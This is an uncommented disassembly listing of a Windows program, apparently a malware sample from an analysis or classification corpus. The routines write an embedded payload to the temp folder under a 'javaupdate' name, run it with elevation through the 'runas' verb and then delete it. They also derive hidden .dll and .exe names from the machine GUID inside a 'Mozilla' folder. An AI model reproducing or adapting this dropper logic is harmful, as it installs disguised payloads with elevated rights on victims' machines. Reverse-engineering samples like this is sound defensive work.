lea     eax, [ebp+buffer]
push    eax
push    200h
call    ds:gettemppathw
lea     esi, [ebp+buffer]
cmp     [ebp+buffer], di
jz      short loc_402159
add     esi, 2
cmp     [esi], di
jnz     short loc_402151
cmp     word ptr [esi-2], 5ch
jz      short loc_40216b
mov     ecx, 5ch
mov     [esi], cx
add     esi, 2
mov     edx, offset ajavaupdate
mov     ecx, 6ah
sub     edx, esi
jmp     short loc_402180
movzx   eax, word ptr [edx+esi+2]
mov     [esi], cx
add     esi, 2
mov     ecx, eax
cmp     ax, di
jnz     short loc_402180
xor     edx, edx
mov     [esi], dx
call    ds:gettickcount
mov     ecx, esi
call    sub_4012d0
mov     edx, offset aexe
mov     esi, 2eh
sub     edx, eax
mov     [eax], si
movzx   ecx, word ptr [edx+eax+2]
add     eax, 2
mov     esi, ecx
cmp     cx, di
jnz     short loc_4021b0
push    edi
push    edi
push    2
push    edi
push    1
push    40000000h
lea     edx, [ebp+buffer]
xor     ecx, ecx
push    edx
mov     [eax], cx
call    ds:createfilew
mov     esi, eax
cmp     esi, 0ffffffffh
jz      loc_4022af
mov     ecx, [ebp+nnumberofbytestowrite]
push    edi
lea     eax, [ebp+nnumberofbytestowrite]
push    eax
push    ecx
push    ebx
push    esi
call    ds:writefile
push    esi
call    ds:closehandle
mov     edx, hheap
push    ebx
push    edi
push    edx
call    ds:heapfree
push    3ch
lea     eax, [ebp+pexecinfo]
push    edi
push    eax
call    _memset
add     esp, 0ch
lea     edx, [ebp+pexecinfo]
lea     ecx, [ebp+buffer]
push    edx
mov     [ebp+pexecinfo.cbsize], 3ch
mov     [ebp+pexecinfo.lpverb], offset arunas
mov     [ebp+pexecinfo.lpfile], ecx
mov     [ebp+pexecinfo.hwnd], edi
mov     [ebp+pexecinfo.lpparameters], edi
mov     [ebp+pexecinfo.nshow], 1
call    ds:shellexecuteexw
test    eax, eax
jnz     short loc_4022be
push    1388h
call    ds:sleep
lea     eax, [ebp+buffer]
push    eax
call    ds:deletefilew
lea     ebx, [ebp+nnumberofbytestowrite]
call    sub_401e80
mov     ebx, eax
cmp     ebx, edi
jnz     loc_402130
pop     esi
pop     edi
pop     ebx
mov     ecx, [ebp+var_4]
xor     ecx, ebp
call    @__security_check_cookie@4
mov     esp, ebp
pop     ebp
retn
mov     ecx, hheap
push    ebx
push    edi
push    ecx
call    ds:heapfree
pop     esi
mov     ecx, [ebp+var_4]
pop     edi
xor     ecx, ebp
pop     ebx
call    @__security_check_cookie@4
mov     esp, ebp
pop     ebp
retn
push    ebp
mov     ebp, esp
sub     esp, 0ach
mov     eax, ___security_cookie
xor     eax, ebp
mov     [ebp+var_4], eax
push    ebx
push    esi
push    edi
call    ds:getprocessheap
mov     hheap, eax
call    ds:gettickcount
mov     dword_44b894, eax
lea     eax, [ebp+systemtimeasfiletime]
push    eax
call    ds:getsystemtimeasfiletime
mov     ecx, [ebp+systemtimeasfiletime.dwhighdatetime]
mov     edx, [ebp+systemtimeasfiletime.dwlowdatetime]
mov     dword_44b898, ecx
mov     dword_44b89c, edx
call    ds:getcurrentprocessid
mov     dword_44b8a0, eax
call    ds:getcurrentthreadid
push    offset dword_44b894
push    offset dword_44b8a4
mov     dword_44b8a4, eax
mov     dword_44b8a8, 0
call    sub_401170
mov     ebx, ds:regopenkeyexw
lea     eax, [ebp+phkresult]
push    eax
push    1
push    0
push    offset asoftwaremicros_0
push    80000002h
call    ebx
mov     edx, [ebp+phkresult]
mov     edi, ds:regqueryvalueexw
lea     ecx, [ebp+cbdata]
push    ecx
push    offset szshortpath
push    0
push    0
push    offset acommonappdata
push    edx
mov     [ebp+cbdata], 200h
call    edi
mov     eax, [ebp+phkresult]
push    eax
call    ds:regclosekey
cmp     szshortpath, 0
mov     eax, offset szshortpath
jz      short loc_4023c0
add     eax, 2
cmp     word ptr [eax], 0
jnz     short loc_4023b7
cmp     word ptr [eax-2], 5ch
jz      short loc_4023d2
mov     ecx, 5ch
mov     [eax], cx
add     eax, 2
mov     esi, offset amozilla
mov     edx, 4dh
sub     esi, eax
movzx   ecx, word ptr [esi+eax+2]
mov     [eax], dx
add     eax, 2
mov     edx, ecx
test    cx, cx
jnz     short loc_4023de
xor     edx, edx
push    edx
push    offset szshortpath
mov     [eax], dx
call    ds:createdirectoryw
push    200h
push    offset szshortpath
push    offset szshortpath
call    ds:getshortpathnamew
lea     eax, [ebp+phkresult]
push    eax
push    101h
push    0
push    offset asoftwaremicros_1
push    80000002h
call    ebx
test    eax, eax
jnz     loc_402669
push    80h
push    eax
lea     ecx, [ebp+data]
push    ecx
call    _memset
mov     ecx, [ebp+phkresult]
add     esp, 0ch
lea     edx, [ebp+cbdata]
push    edx
lea     eax, [ebp+data]
push    eax
push    0
push    0
push    offset amachineguid
push    ecx
mov     [ebp+cbdata], 80h
call    edi
xor     eax, eax
xor     ebx, ebx
lea     esi, [ebp+data]
mov     [ebp+var_14], eax
mov     [ebp+var_10], eax
mov     [ebp+var_c], eax
mov     [ebp+var_8], eax
cmp     word ptr [ebp+data], ax
jz      short loc_4024e9
movzx   eax, word ptr [esi]
lea     edx, [eax-30h]
add     esi, 2
cmp     dx, 9
ja      short loc_4024aa
lea     ecx, [eax-30h]
jmp     short loc_4024c3
cmp     eax, 61h
jb      short loc_4024b4
cmp     eax, 66h
jbe     short loc_4024bd
lea     ecx, [eax-41h]
cmp     cx, 5
ja      short loc_4024e3
and     eax, 0fh
lea     ecx, [eax+9]
mov     eax, ebx
cdq
sub     eax, edx
test    bl, 1
jz      short loc_4024d9
sar     eax, 1
or      byte ptr [ebp+eax+var_14], cl
lea     eax, [ebp+eax+var_14]
jmp     short loc_4024e2
shl     cl, 4
sar     eax, 1
mov     byte ptr [ebp+eax+var_14], cl
inc     ebx
cmp     word ptr [esi], 0
jnz     short loc_402496
mov     edx, [ebp+phkresult]
push    edx
call    ds:regclosekey
mov     esi, 0ah
jmp     short loc_402500
push    offset dword_408948
lea     eax, [ebp+var_14]
push    eax
call    sub_401170
push    offset dword_408948
lea     ecx, [ebp+var_10]
push    ecx
call    sub_401170
push    offset dword_408948
lea     edx, [ebp+var_c]
push    edx
call    sub_401170
dec     esi
jnz     short loc_402500
mov     ax, szshortpath
mov     ecx, offset filename
test    ax, ax
jz      short loc_402562
mov     esi, offset szshortpath
movzx   edx, ax
sub     esi, ecx
jmp     short loc_402550
movzx   eax, word ptr [esi+ecx+2]
mov     [ecx], dx
add     ecx, 2
mov     edx, eax
test    ax, ax
jnz     short loc_402550
xor     eax, eax
mov     [ecx], ax
mov     eax, [ebp+var_14]
call    sub_4012d0
mov     esi, offset adll
mov     edx, 2eh
sub     esi, eax
jmp     short loc_402580
mov     [eax], dx
movzx   ecx, word ptr [esi+eax+2]
add     eax, 2
mov     edx, ecx
test    cx, cx
jnz     short loc_402580
xor     ecx, ecx
mov     [eax], cx
mov     ax, szshortpath
mov     ecx, offset existingfilename
test    ax, ax
jz      short loc_4025c3
mov     esi, offset szshortpath
movzx   edx, ax
sub     esi, ecx
movzx   eax, word ptr [esi+ecx+2]
mov     [ecx], dx
add     ecx, 2
mov     edx, eax
test    ax, ax
jnz     short loc_4025b1
mov     eax, [ebp+var_10]
xor     edx, edx
mov     [ecx], dx
call    sub_4012d0
mov     esi, offset aexe
mov     edx, 2eh
sub     esi, eax
lea     esp, [esp+0]
mov     [eax], dx
movzx   ecx, word ptr [esi+eax+2]
add     eax, 2
mov     edx, ecx
test    cx, cx
jnz     short loc_4025e0
xor     ecx, ecx
mov     [eax], cx
mov     eax, [ebp+var_c]
mov     ecx, offset dword_44b8f0
call    sub_4012d0
mov     eax, [ebp+var_8]
mov     ecx, offset word_44b8b2
call    sub_4012d0
mov     edx, 2dh
mov     substr, dx
call    ds:getcommandlinew
push    offset substr
push    eax
call    _wcsstr
add     esp, 8
test    eax, eax
jz      short loc_402664
call    sub_4013a0
test    al, al
jnz     short loc_402669
call    ds:getversion
and     eax, 0ffh
cmp     eax, 5
jbe     short loc_402669
call    sub_402100
pop     edi
pop     esi
pop     ebx
mov     ecx, [ebp+var_4]
xor     ecx, ebp
call    @__security_check_cookie@4
mov     esp, ebp
pop     ebp
retn
call    sub_401f70
mov     ecx, [ebp+var_4]
pop     edi
pop     esi
xor     ecx, ebp
pop     ebx
call    @__security_check_cookie@4
mov     esp, ebp
pop     ebp
retn
push    ebp
mov     ebp, esp
and     esp, 0fffffff8h
sub     esp, 4ch
mov     eax, ___security_cookie
xor     eax, esp
mov     [esp+4ch+var_4], eax
mov     eax, [ebp+msg]
push    esi
mov     esi, [ebp+hwnd]
cmp     eax, 0fh
ja      short loc_402715
jz      short loc_4026e9
mov     ecx, eax
dec     ecx
jz      short loc_4026c5
dec     ecx
jnz     short loc_402724
push    ecx
call    ds:postquitmessage
xor     eax, eax
pop     esi
mov     ecx, [esp+4ch+var_4]
xor     ecx, esp
call    @__security_check_cookie@4
mov     esp, ebp
pop     ebp
retn    10h
push    0
push    3e8h
push    1
push    esi
call    ds:settimer
xor     eax, eax
pop     esi
mov     ecx, [esp+4ch+var_4]
xor     ecx, esp
call    @__security_check_cookie@4
mov     esp, ebp
pop     ebp
retn    10h
lea     eax, [esp+50h+paint]
push    eax
push    esi
call    ds:beginpaint
lea     ecx, [esp+50h+paint]
push    ecx
push    esi
call    ds:endpaint
xor     eax, eax
pop     esi
mov     ecx, [esp+4ch+var_4]
xor     ecx, esp
call    @__security_check_cookie@4
mov     esp, ebp
pop     ebp
retn    10h
mov     ecx, eax
sub     ecx, 111h
jz      short loc_402776
sub     ecx, 2
jz      short loc_402746
mov     edx, [ebp+lparam]
mov     ecx, [ebp+wparam]
push    edx
push    ecx
push    eax
push    esi
call    ds:defwindowprocw
pop     esi
mov     ecx, [esp+4ch+var_4]
xor     ecx, esp
call    @__security_check_cookie@4
mov     esp, ebp
pop     ebp
retn    10h
mov     eax, dword_44c6c4
inc     eax
mov     dword_44c6c4, eax
cmp     eax, 5
jnz     short loc_4027bd
call    sub_4022d0
push    esi
call    ds:destroywindow
xor     eax, eax
pop     esi
mov     ecx, [esp+4ch+var_4]
xor     ecx, esp
call    @__security_check_cookie@4
mov     esp, ebp
pop     ebp
retn    10h
mov     ecx, [ebp+wparam]
movzx   eax, cx
sub     eax, 68h
jz      short loc_4027a7
dec     eax
jz      short loc_40275b
mov     edx, [ebp+lparam]
push    edx
push    ecx
push    111h
push    esi
call    ds:defwindowprocw
pop     esi
mov     ecx, [esp+4ch+var_4]
xor     ecx, esp
call    @__security_check_cookie@4
mov     esp, ebp
pop     ebp
retn    10h
mov     eax, hinstance
push    0
push    offset dialogfunc
push    esi
push    67h
push    eax
call    ds:dialogboxparamw
mov     ecx, [esp+50h+var_4]
pop     esi
xor     ecx, esp
xor     eax, eax
call    @__security_check_cookie@4
mov     esp, ebp
pop     ebp
retn    10h
push    ebp
mov     ebp, esp
mov     eax, [ebp+arg_4]
sub     eax, 110h
jz      short loc_402813
dec     eax
jnz     short loc_4027ff
mov     eax, [ebp+arg_8]
cmp     ax, 1
jz      short loc_402805
cmp     ax, 2
jz      short loc_402805
xor     eax, eax
pop     ebp
retn    10h
mov     ecx, [ebp+hdlg]
movzx   eax, ax
push    eax
push    ecx
call    ds:enddialog
mov     eax, 1
pop     ebp
retn    10h
push    offset ?__cxxunhandledexceptionfilter@@ygjpau_exception_pointers@@@z
call    ds:setunhandledexceptionfilter
xor     eax, eax
retn
mov     edi, edi
push    esi
mov     eax, offset dword_408bf0
mov     esi, offset dword_408bf0
push    edi
mov     edi, eax
cmp     eax, esi
jnb     short loc_4037aa
mov     eax, [edi]
test    eax, eax
jz      short loc_4037a3
call    eax
add     edi, 4
cmp     edi, esi
jb      short loc_40379b
pop     edi
pop     esi
retn
mov     edi, edi
push    esi
mov     eax, offset dword_408bf8
mov     esi, offset dword_408bf8
push    edi
mov     edi, eax
cmp     eax, esi
jnb     short loc_4037d0
mov     eax, [edi]
test    eax, eax
jz      short loc_4037c9
call    eax
add     edi, 4
cmp     edi, esi
jb      short loc_4037c1
pop     edi
pop     esi
retn
and     dword_44c6cc, 0
retn
push    dword_44b830
call    ds:decodepointer
retn
mov     edi, edi
push    ebp
mov     ebp, esp
mov     eax, [ebp+arg_0]
mov     dword_44b83c, eax
pop     ebp
retn
mov     edi, edi
push    ebp
mov     ebp, esp
mov     eax, [ebp+arg_0]
mov     dword_44b840, eax
pop     ebp
retn
mov     edi, edi
push    ebp
mov     ebp, esp
mov     eax, [ebp+arg_0]
mov     dword_44b844, eax
pop     ebp
retn
mov     edi, edi
push    ebp
mov     ebp, esp
mov     eax, [ebp+arg_0]
mov     dword_44b848, eax
pop     ebp
retn
push    esi
push    4
push    20h
call    __calloc_crt
pop     ecx
pop     ecx
mov     esi, eax
push    esi
call    ds:encodepointer
mov     ptr, eax
mov     dword_44c7e4, eax
test    esi, esi
jnz     short loc_404624
push    18h
pop     eax
pop     esi
retn
and     dword ptr [esi], 0
xor     eax, eax
pop     esi
retn
mov     edi, edi
push    ebp
mov     ebp, esp
sub     esp, 24h
mov     eax, ___security_cookie
xor     eax, ebp
mov     [ebp+var_4], eax
mov     eax, [ebp+arg_0]
push    ebx
mov     [ebp+var_20], eax
mov     eax, [ebp+arg_4]
push    esi
push    edi
mov     [ebp+var_1c], eax
call    __encoded_null
and     [ebp+var_14], 0
cmp     dword_44b84c, 0
mov     [ebp+var_18], eax
jnz     short loc_40493e
push    offset libfilename
call    ds:loadlibraryw
mov     ebx, eax
test    ebx, ebx
jz      loc_4049e6
mov     edi, ds:getprocaddress
push    offset amessageboxw
push    ebx
call    edi
test    eax, eax
jz      loc_4049e6
mov     esi, ds:encodepointer
push    eax
call    esi
push    offset agetactivewindo
push    ebx
mov     dword_44b84c, eax
call    edi
push    eax
call    esi
push    offset agetlastactivep
push    ebx
mov     dword_44b850, eax
call    edi
push    eax
call    esi
push    offset agetuserobjecti
push    ebx
mov     dword_44b854, eax
call    edi
push    eax
call    esi
mov     dword_44b85c, eax
test    eax, eax
jz      short loc_40493e
push    offset agetprocesswind
push    ebx
call    edi
push    eax
call    esi
mov     dword_44b858, eax
mov     eax, dword_44b858
mov     ecx, [ebp+var_18]
mov     esi, ds:decodepointer
cmp     eax, ecx
jz      short loc_404997
cmp     dword_44b85c, ecx
jz      short loc_404997
push    eax
call    esi
push    dword_44b85c
mov     edi, eax
call    esi
mov     ebx, eax
test    edi, edi
jz      short loc_404997
test    ebx, ebx
jz      short loc_404997
call    edi
test    eax, eax
jz      short loc_40498e
lea     ecx, [ebp+var_24]
push    ecx
push    0ch
lea     ecx, [ebp+var_10]
push    ecx
push    1
push    eax
call    ebx
test    eax, eax
jz      short loc_40498e
test    [ebp+var_8], 1
jnz     short loc_404997
or      [ebp+arg_8], 200000h
jmp     short loc_4049ca
mov     eax, dword_44b850
cmp     eax, [ebp+var_18]
jz      short loc_4049ca
push    eax
call    esi
test    eax, eax
jz      short loc_4049ca
call    eax
mov     [ebp+var_14], eax
test    eax, eax
jz      short loc_4049ca
mov     eax, dword_44b854
cmp     eax, [ebp+var_18]
jz      short loc_4049ca
push    eax
call    esi
test    eax, eax
jz      short loc_4049ca
push    [ebp+var_14]
call    eax
mov     [ebp+var_14], eax
push    dword_44b84c
call    esi
test    eax, eax
jz      short loc_4049e6
push    [ebp+arg_8]
push    [ebp+var_1c]
push    [ebp+var_20]
push    [ebp+var_14]
call    eax
jmp     short loc_4049e8
xor     eax, eax
mov     ecx, [ebp+var_4]
pop     edi
pop     esi
xor     ecx, ebp
pop     ebx
call    @__security_check_cookie@4
leave
retn
jmp     short loc_405aee
pop     ecx
retn
push    0ah
call    ds:isprocessorfeaturepresent
mov     dword_44c6c8, eax
xor     eax, eax
retn